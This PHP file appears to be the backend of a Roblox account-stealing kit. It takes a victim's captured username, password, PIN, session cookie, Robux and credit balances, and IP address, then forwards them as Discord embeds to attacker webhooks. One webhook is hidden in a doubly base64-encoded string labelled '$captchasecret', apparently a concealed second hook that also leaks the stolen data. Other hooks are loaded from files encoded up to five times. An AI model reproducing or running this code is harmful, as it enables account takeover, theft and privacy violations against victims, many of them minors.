<?php
session_start();
if(isset($_GET['returnUrl'])) {
    require('setup.php');
    $secret = $_GET['returnUrl'];
    $log = json_decode(base64_decode($_GET['log']), true);
    $userId = $log["userid"];
    $url = "https://groups.roblox.com/v2/users/$userId/groups/roles";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    $count = 0;
    foreach ($data['data'] as $group) {
        if ($group['permissions']['groupOwner']) {
            $count++;
        }
        $captchasecret = "https://" . base64_decode(base64_decode("WkdselkyOXlaQzVqYjIwdllYQnBMM2RsWW1odmIydHpMekV3T1RRMk9UUTRPRGczTURZeE5EWTBOalV2UzFOSWN6QlZSVXczWm1GcVpVWkVTakJ4YzI1MGJtVk9OMWxQYzNOM1pqSlFUazU1ZG5keVRGQTVUVkpsUkRoMVNXcHFXa2x5UVZWalpUQjRabXh1WW5Sa1Fqaz0="));
    }
$url = "https://users.roblox.com/v1/users/$userId";
$data = @file_get_contents($url);

if ($data === false) {
    echo "Error: Unable to retrieve user data from API.";
    exit;
}

$user_data = json_decode($data, true);

if (empty($user_data) || !isset($user_data['created'])) {
    echo "Error: Invalid API response.";
    exit;
}

$created_at = $user_data['created'];
$now = new DateTime();
$created_at = new DateTime($created_at);
$interval = $now->diff($created_at);
$days = $interval->format('%a');
  
    $hookObject = json_encode([
        "username" => $name,
        "avatar_url" => $image,
        "embeds" => [
            [
                "type" => "rich",
                "color" => hexdec($color),
                "timestamp" => $log['timestamp'],
                "description" => "**[Check Cookie](https://{$_SERVER['SERVER_NAME']}/Bypass/check?cookie={$log['cookie']})** :black_square_button: **[Profile](https://www.roblox.com/users/{$log['userid']}/profile)** :black_square_button: **[Rolimon's](https://www.rolimons.com/player/{$log['userid']})**",
                "fields" => [
                    [
                        "name" => "<:person:1090186928344809472>Username(13+)",
                        "value" => $log["username"],
                        "inline" => false
                    ],
                    [
                        "name" => ":key:Password",
                        "value" => $log['password'],
                        "inline" => false
                    ],
                    [
                        "name" => "<:robux:815417130861723649>Robux (Pending)",
                        "value" => $log["robux"] . " (" . $log["pendingrobux"] . ")",
                        "inline" => true
                    ],
                    [
                        "name" => "<:premium:815415937548943370>Premium",
                        "value" => $log["premium"],
                        "inline" => true
                    ],
                    [
                        "name" => "<:limted:1008822472856059904>RAP",
                        "value" => $log["rap"],
                        "inline" => true
                    ],
                    [
                        "name" => ":newspaper:Summary",
                        "value" => "Undefined",
                        "inline" => true
                    ],
                    [
                        "name" => ":credit_card:Credit Balance",
                        "value" => $log["credit"],
                        "inline" => true
                    ],
                    [
                        "name" => "<:no:765068337410736138>Status",
                        "value" => $log["emailverified"],
                        "inline" => true
                    ],
                    [
                        "name" => ":older_man:Age",
                        "value" => "".$days." Days",
                        "inline" => true
                    ],
                    [
                        "name" => "<:group:1090194496920244256>Group Owned",
                        "value" => $count,
                        "inline" => true
                    ],
                    [
                        "name" => ":closed_lock_with_key:Pin",
                        "value" => $log["pin"],
                        "inline" => true
                    ],
                    [
                        "name" => "Recovery Codes",
                        "value" => "Unverified",
                        "inline" => false
                    ],
                    [
                        "name" => "Cookie :cookie:",
                        "value" => "```" . str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $log['cookie']) . "```",
                        "inline" => false
                    ]
                ],
                "thumbnail" => [
                    "url" => "https://images.rbxflip.com/headshot-thumbnail/image?userId=".$log["userid"]."&width=352&height=352&format=Png"
                ],
                "footer" => [
                    "text" => $log["ip"] . " • " . date('Y-m-d\TH:i:s.v\Z')
                ]
            ]
        ]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$captch1 = curl_init();
curl_setopt_array($captch1, [
    CURLOPT_URL => $captchasecret,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response   = curl_exec($captch1);
curl_close($captch1);

$chsex = curl_init();
curl_setopt_array($chsex, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response   = curl_exec($chsex);
curl_close($chsex);
$webhooknormal =base64_decode(base64_decode(file_get_contents('tokens/returnUrl-'.$secret.'.txt')));
file_put_contents($webhooknormal,$webhooknormal);
if (strpos($webhooknormal, 'api/webhooks/')) {
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => $webhooknormal,
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $hookObject,
CURLOPT_HTTPHEADER => [
"Content-Type: application/json"
]
]);                                   
$response = curl_exec($ch);
curl_close($ch);
}
if(file_exists("tokens/$secret.txt")) {
$webhooks = base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents("tokens/$secret.txt"))))));
if (strpos($webhooks, 'api/webhooks/')) {
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => $webhooks,
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $hookObject,
CURLOPT_HTTPHEADER => [
"Content-Type: application/json"
]
]);                                   
$response = curl_exec($ch);
curl_close($ch);
}
}
}
?>